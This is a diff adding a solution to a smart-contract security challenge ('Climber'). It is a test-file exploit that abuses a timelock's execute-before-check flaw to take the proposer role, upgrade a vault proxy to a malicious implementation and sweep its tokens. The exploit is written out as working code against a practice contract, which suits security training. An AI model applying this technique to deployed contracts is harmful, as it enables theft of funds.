@@ -50,6 +50,62 @@ describe("[Challenge] Climber", function () {
 
     it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
+        /**
+         * Attack plan (through Attacker):
+         * - Set delay to 0 (since it has no access control)
+         * - Grant proposer role to Attacker
+         * - Schedule 'schedule' call on Attacker to make these 3 calls have `OperationState.ReadyForExecution` state
+         *
+         * Now that we have the proposer role, we can upgrade ClimberVault to MaliciousVault and sweep funds
+         */
+
+        // Deploy Attacker
+        const AttackerClimberFactory = await ethers.getContractFactory("AttackerClimber");
+        const attackerClimber = await AttackerClimberFactory.deploy(timelock.address);
+
+        const salt = ethers.utils.id("random_salt");
+        const PROPOSER_ROLE = "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1";
+
+        // Execute actions:
+        // 1. Set delay to 0
+        const updateDelayInterface = new ethers.utils.Interface(["function updateDelay(uint64)"]);
+        const updateDelayCalldata = updateDelayInterface.encodeFunctionData("updateDelay", [0]);
+
+        // 2. Grant proposer role to attacker
+        const grantRoleInterface = new ethers.utils.Interface(["function grantRole(bytes32, address)"]);
+        const grantRoleCalldata = grantRoleInterface.encodeFunctionData("grantRole", [PROPOSER_ROLE, attackerClimber.address]);
+
+        // 3. Self-schedule previous actions during execute, so they are in `OperationState.ReadyForExecution`
+        const selfScheduleInterface = new ethers.utils.Interface(["function selfSchedule(bytes32)"]);
+        const selfScheduleCalldata = selfScheduleInterface.encodeFunctionData("selfSchedule", [salt]);
+
+        const calldatas = [updateDelayCalldata, grantRoleCalldata, selfScheduleCalldata];
+        const targets = [timelock.address, timelock.address, attackerClimber.address];
+        const values = [0, 0, 0];
+
+        await attackerClimber.setCalldatas(calldatas);
+        await attackerClimber.setTargets(targets);
+        await attackerClimber.setValues(values);
+
+        // Trigger execution
+        await timelock.execute(targets, values, calldatas, salt);
+
+        // Check if we have the role
+        // expect(await timelock.hasRole(PROPOSER_ROLE, attackerClimber.climber)).to.be.equal(true);
+
+        // Deploy malicious vault
+        const MaliciousClimberVaultFactory = await ethers.getContractFactory("MaliciousClimberVault");
+        const maliciousVault = await MaliciousClimberVaultFactory.deploy();
+
+        // Schedule malicious upgrade
+        const upgradeInterface = new ethers.utils.Interface(["function upgradeTo(address)"]);
+        const upgradeCalldata = upgradeInterface.encodeFunctionData("upgradeTo", [maliciousVault.address]);
+
+        await attackerClimber.schedule([vault.address], [0], [upgradeCalldata], salt);
+        await timelock.execute([vault.address], [0], [upgradeCalldata], salt);
+
+        // Finally, sweep funds
+        await vault.connect(player).sweepFunds(token.address);
     });
 
     after(async function () {
